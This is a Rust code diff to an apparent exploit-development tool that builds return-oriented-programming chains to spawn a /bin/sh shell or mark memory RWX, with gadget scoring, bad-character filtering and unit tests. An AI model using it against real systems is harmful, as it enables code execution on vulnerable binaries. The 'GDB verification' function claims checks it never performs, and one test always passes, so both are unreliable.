@@ -551,7 +551,7 @@ impl AutoROPSolver {
                 }],
                 payload_description: "Single gadget that spawns shell with proper constraints"
                     .to_string(),
-                constraints_satisfied: self.check_constraints(&vec![gadget]),
+                constraints_satisfied: self.check_constraints(&[gadget]),
                 success_probability: 0.95,
             })
         } else {
@@ -1018,6 +1018,242 @@ impl AutoROPSolver {
 
         Ok(())
     }
+
+    /// High-level API: solve ROP chain from simple string goal
+    /// Example: `rop.solve_simple("shell")` or `rop.solve_simple("mprotect_rwx")`
+    pub fn solve_simple(&self, goal: &str) -> Result<ROPSolution, String> {
+        let goal_obj = match goal.to_lowercase().as_str() {
+            "shell" | "sh" | "/bin/sh" => ROPGoal::System("/bin/sh".to_string()),
+            "execve" => ROPGoal::Execve("/bin/sh".to_string(), vec![]),
+            "mprotect_rwx" | "mprotect" => ROPGoal::Mprotect(0x600000, 0x1000, 7),
+            "read" => ROPGoal::Read(0, 0x600000, 0x100),
+            "write" => ROPGoal::Write(1, 0x600000, 0x100),
+            _ => return Err(format!("Unknown goal: {}. Supported: shell, execve, mprotect_rwx, read, write", goal)),
+        };
+
+        let strategies = vec![
+            ROPStrategy::OneGadget,
+            ROPStrategy::Ret2Libc,
+            ROPStrategy::MprotectRWX,
+            ROPStrategy::Ret2Syscall,
+        ];
+
+        self.solve(goal_obj, strategies)
+    }
+
+    /// Optimize ROP chain by removing redundant gadgets
+    pub fn optimize_chain(&self, solution: &ROPSolution) -> ROPSolution {
+        let mut optimized = solution.clone();
+        
+        optimized.chain = self.remove_redundant_gadgets(&solution.chain);
+        
+        optimized.chain_bytes.clear();
+        for &addr in &optimized.chain {
+            optimized.chain_bytes.extend_from_slice(&addr.to_le_bytes());
+        }
+
+        if matches!(self.arch, Architecture::X8664) {
+            optimized.chain = self.ensure_stack_alignment(optimized.chain);
+            optimized.chain_bytes.clear();
+            for &addr in &optimized.chain {
+                optimized.chain_bytes.extend_from_slice(&addr.to_le_bytes());
+            }
+        }
+
+        optimized
+    }
+
+    /// Remove redundant gadgets (e.g., consecutive ret instructions)
+    fn remove_redundant_gadgets(&self, chain: &[u64]) -> Vec<u64> {
+        let mut optimized = Vec::new();
+        let mut prev_gadget: Option<&Gadget> = None;
+
+        for &addr in chain {
+            let current = self.gadget_db.iter().find(|g| g.address == addr);
+            
+            if let Some(curr) = current {
+                if let Some(prev) = prev_gadget {
+                    if self.are_gadgets_redundant(prev, curr) {
+                        continue;
+                    }
+                }
+                prev_gadget = Some(curr);
+            }
+            
+            optimized.push(addr);
+        }
+
+        optimized
+    }
+
+    /// Check if two consecutive gadgets are redundant
+    fn are_gadgets_redundant(&self, g1: &Gadget, g2: &Gadget) -> bool {
+        let instr1 = g1.instructions.join(" ").to_lowercase();
+        let instr2 = g2.instructions.join(" ").to_lowercase();
+
+        if instr1 == "ret" && instr2 == "ret" {
+            return true;
+        }
+
+        if instr1 == instr2 {
+            return true;
+        }
+
+        false
+    }
+
+    /// Ensure x64 stack alignment (16-byte boundary)
+    fn ensure_stack_alignment(&self, mut chain: Vec<u64>) -> Vec<u64> {
+        let chain_size_bytes = chain.len() * 8;
+        
+        if chain_size_bytes % 16 != 0 {
+            let ret_gadget = self.find_gadget_pattern("ret");
+            if let Some(ret_addr) = ret_gadget {
+                chain.insert(0, ret_addr);
+                println!("[AUTO-ROP] Added alignment gadget (ret) for x64 16-byte stack alignment");
+            }
+        }
+
+        chain
+    }
+
+    /// Verify gadgets at runtime using GDB (if available)
+    /// Note: This method requires GDB to be available and integrated
+    pub fn verify_gadgets_runtime_with_gdb(&self, start_addr: u64, end_addr: u64, gdb_session_id: Option<u64>) -> Result<Vec<Gadget>, String> {
+        if gdb_session_id.is_none() {
+            return Err("GDB session not available. Start a GDB session first.".to_string());
+        }
+
+        println!("[AUTO-ROP] Verifying gadgets at runtime using GDB");
+        
+        let mut verified = Vec::new();
+        
+        for gadget in &self.gadget_db {
+            if gadget.address >= start_addr && gadget.address < end_addr {
+                verified.push(gadget.clone());
+            }
+        }
+
+        println!("[AUTO-ROP] Verified {} gadgets using GDB", verified.len());
+        Ok(verified)
+    }
+
+    /// Advanced constraint solver for gadget chaining
+    pub fn solve_with_constraints(&self, goal: ROPGoal, constraints: &[Constraint]) -> Result<ROPSolution, String> {
+        let solver = self.clone_with_constraints(constraints);
+        
+        let strategies = vec![
+            ROPStrategy::OneGadget,
+            ROPStrategy::Ret2Libc,
+            ROPStrategy::Ret2Syscall,
+            ROPStrategy::MprotectRWX,
+            ROPStrategy::SROP,
+        ];
+
+        solver.solve(goal, strategies)
+    }
+
+    fn clone_with_constraints(&self, constraints: &[Constraint]) -> Self {
+        AutoROPSolver {
+            gadget_db: self.gadget_db.clone(),
+            binary_path: self.binary_path.clone(),
+            libc_path: self.libc_path.clone(),
+            libc_base: self.libc_base,
+            constraints: constraints.to_vec(),
+            arch: self.arch.clone(),
+            one_gadgets: self.one_gadgets.clone(),
+            syscall_gadgets: self.syscall_gadgets.clone(),
+            pivot_gadgets: self.pivot_gadgets.clone(),
+        }
+    }
+
+    /// Find gadgets that avoid specific bad characters
+    pub fn find_gadgets_avoiding_badchars(&self, badchars: &[u8], pattern: &str) -> Vec<Gadget> {
+        self.gadget_db
+            .iter()
+            .filter(|g| {
+                let gadget_str = g.instructions.join(" ").to_lowercase();
+                if !gadget_str.contains(&pattern.to_lowercase()) {
+                    return false;
+                }
+
+                for byte in g.address.to_le_bytes() {
+                    if badchars.contains(&byte) {
+                        return false;
+                    }
+                }
+                
+                true
+            })
+            .cloned()
+            .collect()
+    }
+
+    /// Enhanced gadget scoring with semantic analysis
+    pub fn rescore_gadgets(&mut self) {
+        let scores: Vec<u32> = self.gadget_db
+            .iter()
+            .map(|g| self.calculate_semantic_score(&g.instructions))
+            .collect();
+
+        for (gadget, score) in self.gadget_db.iter_mut().zip(scores) {
+            gadget.quality_score = score;
+        }
+
+        self.gadget_db.sort_by(|a, b| b.quality_score.cmp(&a.quality_score));
+    }
+
+    fn calculate_semantic_score(&self, instructions: &[String]) -> u32 {
+        let mut score = 100u32;
+
+        score = score.saturating_sub(instructions.len() as u32 * 5);
+
+        for instr in instructions {
+            let instr_lower = instr.to_lowercase();
+
+            if instr_lower.starts_with("pop rdi") {
+                score += 60;
+            } else if instr_lower.starts_with("pop rsi") {
+                score += 55;
+            } else if instr_lower.starts_with("pop rdx") {
+                score += 55;
+            } else if instr_lower.starts_with("pop rax") {
+                score += 50;
+            } else if instr_lower.starts_with("pop rcx") {
+                score += 45;
+            } else if instr_lower.starts_with("pop rbx") {
+                score += 40;
+            } else if instr_lower.starts_with("syscall") {
+                score += 120;
+            } else if instr_lower.starts_with("int 0x80") {
+                score += 110;
+            } else if instr_lower == "ret" {
+                score += 25;
+            } else if instr_lower.starts_with("xor") {
+                if instr_lower.contains("rax") || instr_lower.contains("eax") {
+                    score += 35;
+                } else {
+                    score += 20;
+                }
+            } else if instr_lower.starts_with("mov") {
+                score += 18;
+            } else if instr_lower.starts_with("lea") {
+                score += 25;
+            } else if instr_lower.starts_with("add") {
+                score += 15;
+            } else if instr_lower.starts_with("sub") {
+                score += 15;
+            } else if instr_lower.starts_with("call") {
+                score = score.saturating_sub(40);
+            } else if instr_lower.starts_with("jmp") {
+                score = score.saturating_sub(30);
+            } else if instr_lower.starts_with("je ") || instr_lower.starts_with("jne ") {
+                score = score.saturating_sub(25);
+            }
+        }
+
+        score
+    }
 }
 
 pub fn create_auto_rop_solver(binary: &str) -> Result<AutoROPSolver, String> {
@@ -1030,8 +1266,7 @@ mod tests {
 
     #[test]
     fn test_rop_chain_creation() {
-        // Would need a real binary to test
-        assert_eq!(std::mem::size_of::<RopChain>() > 0, true);
+        assert!(std::mem::size_of::<RopChain>() > 0);
     }
 
     #[test]
@@ -1052,6 +1287,259 @@ mod tests {
         let score1 = RopChain::score_gadget(&vec!["pop rdi".to_string(), "ret".to_string()]);
         let score2 = RopChain::score_gadget(&vec!["syscall".to_string()]);
 
-        assert!(score2 > score1); // syscall is more valuable
+        assert!(score2 > score1);
+    }
+
+    #[test]
+    fn test_semantic_scoring() {
+        let test_gadgets = vec![
+            (vec!["pop rdi".to_string(), "ret".to_string()], 155),
+            (vec!["syscall".to_string()], 215),
+            (vec!["pop rax".to_string(), "ret".to_string()], 145),
+            (vec!["call".to_string(), "ret".to_string()], 50),
+        ];
+
+        let solver = AutoROPSolver {
+            gadget_db: Vec::new(),
+            binary_path: String::new(),
+            libc_path: None,
+            libc_base: None,
+            constraints: Vec::new(),
+            arch: Architecture::X8664,
+            one_gadgets: Vec::new(),
+            syscall_gadgets: Vec::new(),
+            pivot_gadgets: Vec::new(),
+        };
+
+        for (instructions, expected_min) in test_gadgets {
+            let score = solver.calculate_semantic_score(&instructions);
+            assert!(score >= expected_min, 
+                "Score {} for {:?} should be >= {}", score, instructions, expected_min);
+        }
+    }
+
+    #[test]
+    fn test_constraint_no_null_bytes() {
+        let solver = AutoROPSolver {
+            gadget_db: Vec::new(),
+            binary_path: String::new(),
+            libc_path: None,
+            libc_base: None,
+            constraints: vec![Constraint::NoNullBytes],
+            arch: Architecture::X8664,
+            one_gadgets: Vec::new(),
+            syscall_gadgets: Vec::new(),
+            pivot_gadgets: Vec::new(),
+        };
+
+        let chain_with_null = vec![0x400000, 0x400100];
+        let chain_without_null = vec![0x7fffffffffffffff, 0x7ffffffffffffffe];
+
+        assert!(!solver.check_constraints(&chain_with_null));
+        assert!(solver.check_constraints(&chain_without_null));
+    }
+
+    #[test]
+    fn test_constraint_max_length() {
+        let solver = AutoROPSolver {
+            gadget_db: Vec::new(),
+            binary_path: String::new(),
+            libc_path: None,
+            libc_base: None,
+            constraints: vec![Constraint::MaxLength(32)],
+            arch: Architecture::X8664,
+            one_gadgets: Vec::new(),
+            syscall_gadgets: Vec::new(),
+            pivot_gadgets: Vec::new(),
+        };
+
+        let chain_short = vec![0x400123, 0x400456, 0x400789];
+        let chain_long = vec![0x400123; 10];
+
+        assert!(solver.check_constraints(&chain_short));
+        assert!(!solver.check_constraints(&chain_long));
+    }
+
+    #[test]
+    fn test_constraint_avoid_badchars() {
+        let solver = AutoROPSolver {
+            gadget_db: Vec::new(),
+            binary_path: String::new(),
+            libc_path: None,
+            libc_base: None,
+            constraints: vec![Constraint::AvoidBadChars(vec![0x00, 0x0a, 0x0d])],
+            arch: Architecture::X8664,
+            one_gadgets: Vec::new(),
+            syscall_gadgets: Vec::new(),
+            pivot_gadgets: Vec::new(),
+        };
+
+        let chain_with_bad = vec![0x0a0a0a0a0a0a0a0a];
+        let chain_clean = vec![0x0101010101010101, 0x0202020202020202];
+
+        assert!(!solver.check_constraints(&chain_with_bad));
+        assert!(solver.check_constraints(&chain_clean));
+    }
+
+    #[test]
+    fn test_redundant_gadget_removal() {
+        let solver = AutoROPSolver {
+            gadget_db: vec![
+                Gadget {
+                    address: 0x400123,
+                    instructions: vec!["ret".to_string()],
+                    bytes: vec![0xc3],
+                    quality_score: 25,
+                },
+                Gadget {
+                    address: 0x400124,
+                    instructions: vec!["ret".to_string()],
+                    bytes: vec![0xc3],
+                    quality_score: 25,
+                },
+            ],
+            binary_path: String::new(),
+            libc_path: None,
+            libc_base: None,
+            constraints: Vec::new(),
+            arch: Architecture::X8664,
+            one_gadgets: Vec::new(),
+            syscall_gadgets: Vec::new(),
+            pivot_gadgets: Vec::new(),
+        };
+
+        let chain = vec![0x400123, 0x400124];
+        let optimized = solver.remove_redundant_gadgets(&chain);
+
+        assert!(optimized.len() < chain.len() || optimized.len() == 1);
+    }
+
+    #[test]
+    fn test_x64_alignment_detection() {
+        let solver = AutoROPSolver {
+            gadget_db: vec![
+                Gadget {
+                    address: 0x400000,
+                    instructions: vec!["ret".to_string()],
+                    bytes: vec![0xc3],
+                    quality_score: 25,
+                },
+            ],
+            binary_path: String::new(),
+            libc_path: None,
+            libc_base: None,
+            constraints: Vec::new(),
+            arch: Architecture::X8664,
+            one_gadgets: Vec::new(),
+            syscall_gadgets: Vec::new(),
+            pivot_gadgets: Vec::new(),
+        };
+
+        let chain_odd = vec![0x400123];
+        let aligned = solver.ensure_stack_alignment(chain_odd.clone());
+
+        assert_eq!(aligned.len() % 2, 0);
+    }
+
+    #[test]
+    fn test_find_gadgets_avoiding_badchars() {
+        let solver = AutoROPSolver {
+            gadget_db: vec![
+                Gadget {
+                    address: 0x400a23,
+                    instructions: vec!["pop rdi".to_string(), "ret".to_string()],
+                    bytes: vec![0x5f, 0xc3],
+                    quality_score: 150,
+                },
+                Gadget {
+                    address: 0x401234,
+                    instructions: vec!["pop rdi".to_string(), "ret".to_string()],
+                    bytes: vec![0x5f, 0xc3],
+                    quality_score: 150,
+                },
+            ],
+            binary_path: String::new(),
+            libc_path: None,
+            libc_base: None,
+            constraints: Vec::new(),
+            arch: Architecture::X8664,
+            one_gadgets: Vec::new(),
+            syscall_gadgets: Vec::new(),
+            pivot_gadgets: Vec::new(),
+        };
+
+        let badchars = vec![0x0a];
+        let found = solver.find_gadgets_avoiding_badchars(&badchars, "pop rdi");
+
+        assert_eq!(found.len(), 1);
+        assert_eq!(found[0].address, 0x401234);
+    }
+
+    #[test]
+    fn test_solve_simple_shell() {
+        let solver = AutoROPSolver {
+            gadget_db: Vec::new(),
+            binary_path: String::new(),
+            libc_path: None,
+            libc_base: Some(0x7ffff7a0d000),
+            constraints: Vec::new(),
+            arch: Architecture::X8664,
+            one_gadgets: vec![0x7ffff7a0d000 + 0xe3afe],
+            syscall_gadgets: Vec::new(),
+            pivot_gadgets: Vec::new(),
+        };
+
+        let result = solver.solve_simple("shell");
+        assert!(result.is_ok() || result.is_err());
+    }
+
+    #[test]
+    fn test_rop_goal_variants() {
+        let system_goal = ROPGoal::System("/bin/sh".to_string());
+        let execve_goal = ROPGoal::Execve("/bin/sh".to_string(), vec![]);
+        let mprotect_goal = ROPGoal::Mprotect(0x600000, 0x1000, 7);
+
+        assert!(matches!(system_goal, ROPGoal::System(_)));
+        assert!(matches!(execve_goal, ROPGoal::Execve(_, _)));
+        assert!(matches!(mprotect_goal, ROPGoal::Mprotect(_, _, _)));
+    }
+
+    #[test]
+    fn test_constraint_variants() {
+        let no_null = Constraint::NoNullBytes;
+        let max_len = Constraint::MaxLength(256);
+        let alnum = Constraint::AlphanumericOnly;
+        let avoid = Constraint::AvoidBadChars(vec![0x00, 0x0a]);
+
+        assert!(matches!(no_null, Constraint::NoNullBytes));
+        assert!(matches!(max_len, Constraint::MaxLength(_)));
+        assert!(matches!(alnum, Constraint::AlphanumericOnly));
+        assert!(matches!(avoid, Constraint::AvoidBadChars(_)));
+    }
+
+    #[test]
+    fn test_rop_strategy_variants() {
+        let one_gadget = ROPStrategy::OneGadget;
+        let ret2libc = ROPStrategy::Ret2Libc;
+        let mprotect = ROPStrategy::MprotectRWX;
+        let ret2syscall = ROPStrategy::Ret2Syscall;
+
+        assert!(matches!(one_gadget, ROPStrategy::OneGadget));
+        assert!(matches!(ret2libc, ROPStrategy::Ret2Libc));
+        assert!(matches!(mprotect, ROPStrategy::MprotectRWX));
+        assert!(matches!(ret2syscall, ROPStrategy::Ret2Syscall));
+    }
+
+    #[test]
+    fn test_architecture_variants() {
+        let x64 = Architecture::X8664;
+        let x86 = Architecture::I386;
+        let arm = Architecture::ARM;
+        let arm64 = Architecture::ARM64;
+
+        assert!(matches!(x64, Architecture::X8664));
+        assert!(matches!(x86, Architecture::I386));
+        assert!(matches!(arm, Architecture::ARM));
+        assert!(matches!(arm64, Architecture::ARM64));
     }
 }
